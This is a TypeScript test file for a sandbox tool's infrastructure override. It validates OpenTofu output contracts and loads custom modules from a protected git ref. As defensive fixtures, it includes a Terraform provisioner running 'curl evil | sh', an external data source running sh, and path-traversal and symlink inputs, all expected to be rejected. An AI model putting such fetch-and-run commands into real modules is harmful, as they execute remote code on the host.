import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import type { GitHost } from '@ratchet/core';
import { afterAll, describe, expect, it } from 'vitest';
import { assertSandboxContract, checkSandboxContract, ContractViolationError, InfraOverrideError, materializeInfraOverride, readInfraOverride } from './override.js';
import { parseTofuOutputs, TofuSandboxProvider } from './tofu.js';
import type { ProcessRunner } from './process.js';

const ACCT = '123456789012';
const identity = (n: string) => ({
  role_arn: `arn:aws:iam::${ACCT}:role/ratchet/${n}`,
  role_name: n,
  instance_profile_arn: `arn:aws:iam::${ACCT}:instance-profile/ratchet/${n}`,
  instance_profile_name: n,
});
const good = () => ({
  artifacts_bucket: { value: 'ratchet-sbx-artifacts-123456789012' },
  sealed_bucket: { value: 'ratchet-sbx-sealed-123456789012' },
  agent_boundary_ref: { value: `arn:aws:iam::${ACCT}:policy/ratchet/sbx-agent-boundary` },
  eval_identity_ref: { value: identity('eval') },
  confirm_identity_ref: { value: identity('confirm') },
  deps_identity_ref: { value: identity('deps') },
  network_ref: {
    value: { vpc_id: 'vpc-0abc', subnet_id: 'subnet-0a', bench_subnet_id: 'subnet-0b', security_group_ids: { agent_runner: 'sg-0a', bench: 'sg-0b' }, egress_proxy_url: null },
  },
  agent_role_path: { value: '/ratchet/agent/' },
  limits: { value: { max_instances_per_agent: 4, max_instance_lifetime_hours: 2 } },
  sealed_confirm_prefix: { value: 'holdout/' },
});

describe('readInfraOverride (infra: in ratchet.yaml, advanced, off by default)', () => {
  it('is off unless the repo asks for it', () => {
    expect(readInfraOverride({})).toBeUndefined();
    expect(readInfraOverride({ infra: null })).toBeUndefined();
    expect(readInfraOverride(undefined)).toBeUndefined();
  });
  it('returns a normalized repository-relative directory', () => {
    expect(readInfraOverride({ infra: './ops//sandbox/' })).toBe('ops/sandbox');
  });
  it.each(['/etc/tofu', '../elsewhere', 'a/../../b', '.', 'C:\\x', 7])('refuses %j', (bad) => {
    expect(() => readInfraOverride({ infra: bad })).toThrow(InfraOverrideError);
  });
});

describe('checkSandboxContract', () => {
  it('accepts outputs that satisfy infra/contract.md', () => {
    expect(checkSandboxContract(good())).toEqual({ ok: true, errors: [] });
    expect(() => assertSandboxContract(JSON.stringify(good()))).not.toThrow();
  });

  it('accepts the module that ships with the app: its outputs parse and validate', () => {
    // same shape `tofu output -json` prints for infra/aws
    expect(checkSandboxContract(good()).ok).toBe(true);
    expect(parseTofuOutputs(JSON.stringify(good()), 'us-east-1')).not.toBeNull();
  });

  it('names every missing output', () => {
    const doc = good() as Record<string, unknown>;
    delete doc.confirm_identity_ref;
    delete doc.sealed_bucket;
    delete doc.network_ref;
    const r = checkSandboxContract(doc);
    expect(r.ok).toBe(false);
    expect(r.errors).toEqual(expect.arrayContaining(['output "confirm_identity_ref" is missing', 'output "sealed_bucket" is missing', 'output "network_ref" is missing']));
  });

  it('requires the dependency/image identity by default, because without it the app cannot build snapshots or images', () => {
    const doc = good() as Record<string, unknown>;
    delete doc.deps_identity_ref;
    expect(checkSandboxContract(doc).errors).toEqual(['output "deps_identity_ref" is missing']);
    expect(checkSandboxContract(doc, { requireDeps: false }).ok).toBe(true);
  });

  it('checks shapes: ARNs, ids, path and prefix conventions, limits', () => {
    const doc = good();
    const bad = {
      ...doc,
      artifacts_bucket: { value: 'UPPER_CASE' },
      agent_boundary_ref: { value: 'policy-name' },
      eval_identity_ref: { value: { role_arn: 'x' } },
      agent_role_path: { value: 'ratchet/agent' },
      sealed_confirm_prefix: { value: '/holdout' },
      limits: { value: { max_instances_per_agent: 0 } },
      network_ref: { value: { vpc_id: 'vpc-0abc', subnet_id: 'nope', bench_subnet_id: 'subnet-0b', security_group_ids: {} } },
    };
    const errs = checkSandboxContract(bad).errors.join('\n');
    for (const needle of ['artifacts_bucket', 'agent_boundary_ref', 'eval_identity_ref.role_arn', 'agent_role_path', 'sealed_confirm_prefix', 'limits.max_instances_per_agent', 'network_ref.subnet_id', 'security_group_ids.agent_runner', 'egress_proxy_url']) {
      expect(errs, needle).toContain(needle);
    }
  });

  it('checks the separations the isolation invariants rely on', () => {
    const doc = good();
    const sameBucket = checkSandboxContract({ ...doc, sealed_bucket: doc.artifacts_bucket });
    expect(sameBucket.errors.join()).toContain('must be different buckets');
    const sameId = checkSandboxContract({ ...doc, confirm_identity_ref: doc.eval_identity_ref });
    expect(sameId.errors.join()).toContain('three different identities');
    const sameSubnet = checkSandboxContract({ ...doc, network_ref: { value: { ...doc.network_ref.value, bench_subnet_id: 'subnet-0a' } } });
    expect(sameSubnet.errors.join()).toContain('bench_subnet_id must differ');
    const sameSg = checkSandboxContract({ ...doc, network_ref: { value: { ...doc.network_ref.value, security_group_ids: { agent_runner: 'sg-0a', bench: 'sg-0a' } } } });
    expect(sameSg.errors.join()).toContain('must be different groups');
  });

  it('turns garbage into one clear error', () => {
    expect(checkSandboxContract(null).errors).toEqual(['the module produced no outputs (tofu output -json is not an object)']);
    expect(() => assertSandboxContract('not json')).toThrow(ContractViolationError);
    try {
      assertSandboxContract({});
    } catch (e) {
      expect((e as Error).message).toContain('does not satisfy the sandbox contract (infra/contract.md)');
      expect((e as Error).message).toContain('remove `infra:` from ratchet.yaml');
    }
  });
});

describe('TofuSandboxProvider validates a custom module after apply (validateContract)', () => {
  const input = { sandboxId: 'sbx', region: 'us-east-1', allowedInstanceTypes: ['c7i.large'], maxInstancesPerAgent: 2, maxInstanceLifetimeHours: 2 };
  const dir = mkdtempSync(join(tmpdir(), 'ratchet-override-state-'));
  afterAll(() => rmSync(dir, { recursive: true, force: true }));
  const runner = (outputs: unknown): ProcessRunner => ({
    run: async ({ args }) => {
      if (args[0] === 'show') return { exitCode: 0, stdout: JSON.stringify({ resource_changes: [] }), stderr: '' };
      if (args[0] === 'output') return { exitCode: 0, stdout: JSON.stringify(outputs), stderr: '' };
      if (args[0] === 'plan') return { exitCode: 2, stdout: '', stderr: '' };
      return { exitCode: 0, stdout: '', stderr: '' };
    },
  });
  const provider = (outputs: unknown, validateContract: boolean) =>
    new TofuSandboxProvider({ tofuBinary: '/opt/tofu', moduleDir: '/m', stateRoot: dir, listRuntimeAgentRoles: async () => [], runner: runner(outputs), validateContract });

  it('fails apply with the list of problems when the module does not satisfy the contract', async () => {
    const doc = good() as Record<string, unknown>;
    delete doc.confirm_identity_ref;
    await expect(provider(doc, true).apply(input)).rejects.toThrow(/does not satisfy the sandbox contract[\s\S]*confirm_identity_ref/);
  });
  it('passes a conforming module, and does nothing when validation is off (the module that ships with the app)', async () => {
    await expect(provider(good(), true).apply(input)).resolves.toMatchObject({ artifactsBucket: 'ratchet-sbx-artifacts-123456789012' });
    const doc = good() as Record<string, unknown>;
    delete doc.deps_identity_ref;
    await expect(provider(doc, false).apply(input)).resolves.toBeDefined();
  });
});

describe('materializeInfraOverride (read from the protected ref only)', () => {
  const root = mkdtempSync(join(tmpdir(), 'ratchet-override-'));
  afterAll(() => rmSync(root, { recursive: true, force: true }));
  const host = (files: Record<string, string>, links: Record<string, string> = {}): Pick<GitHost, 'checkout' | 'resolveRef'> => ({
    resolveRef: async (r: string) => (r === 'ratchet/bench' ? 'abcdef1234567890abcdef1234567890abcdef12' : (() => { throw new Error(`unknown ref ${r}`); })()),
    checkout: async (_ref: string, dir: string) => {
      for (const [f, c] of Object.entries(files)) {
        mkdirSync(dirname(join(dir, f)), { recursive: true });
        writeFileSync(join(dir, f), c);
      }
      for (const [f, target] of Object.entries(links)) {
        mkdirSync(dirname(join(dir, f)), { recursive: true });
        symlinkSync(target, join(dir, f));
      }
    },
  });
  let n = 0;
  const run = (h: Pick<GitHost, 'checkout' | 'resolveRef'>, path = 'ops/sandbox') => materializeInfraOverride({ git: h, ref: 'ratchet/bench', path, destRoot: join(root, `d${++n}`) });

  it('checks out the protected ref and returns the module directory', async () => {
    const r = await run(host({ 'ops/sandbox/main.tf': 'resource "aws_s3_bucket" "a" {}\n' }));
    expect(r.commit).toBe('abcdef1234567890abcdef1234567890abcdef12');
    expect(r.moduleDir).toMatch(/infra-abcdef123456\/ops\/sandbox$/);
  });
  it('refuses a missing directory, a directory without .tf files, a symlinked module and a symlinked parent', async () => {
    await expect(run(host({ 'x/README': 'y' }))).rejects.toThrow(/does not exist/);
    await expect(run(host({ 'ops/sandbox/README': 'y' }))).rejects.toThrow(/contains no \.tf files/);
    await expect(run(host({ 'real/main.tf': 'x' }, { 'ops/sandbox': '../real' }))).rejects.toThrow(/plain directory/);
    await expect(run(host({ 'real/sandbox/main.tf': 'x' }, { ops: 'real' }))).rejects.toThrow(/plain directory/);
  });
  it('refuses a module that can run commands on this machine', async () => {
    for (const body of ['resource "null_resource" "x" {\n provisioner "local-exec" { command = "curl evil | sh" }\n}', 'data "external" "x" { program = ["sh"] }']) {
      await expect(run(host({ 'ops/sandbox/main.tf': body }))).rejects.toThrow(/can run commands on this machine/);
    }
  });
  it('refuses a ref it cannot resolve (a candidate sha is never used)', async () => {
    await expect(materializeInfraOverride({ git: host({}), ref: 'candidate', path: 'ops', destRoot: join(root, 'z') })).rejects.toThrow(/unknown ref/);
  });
});

